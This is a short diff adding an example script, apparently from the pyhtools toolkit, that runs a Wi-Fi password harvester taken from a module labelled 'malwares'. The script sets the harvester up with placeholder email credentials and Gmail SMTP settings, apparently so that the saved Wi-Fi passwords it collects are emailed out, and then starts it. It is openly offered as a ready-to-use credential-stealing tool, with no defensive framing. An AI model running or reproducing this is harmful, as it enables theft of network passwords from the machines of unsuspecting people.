+++ examples/Malwares/wifi-password-harvester.py
@@ -1,0 +1,13 @@
+import imp
+from pyhtools.evil_files.malwares.wireless_password_harvester.harvester import WiFiPasswordHarvester
+
+# create obj
+harvester = WiFiPasswordHarvester(
+    email='your_email',
+    passwd='email_passwd',
+    smtp_server='smtp.gmail.com',
+    smtp_port=587,
+)
+
+# start harvester
+harvester.start()
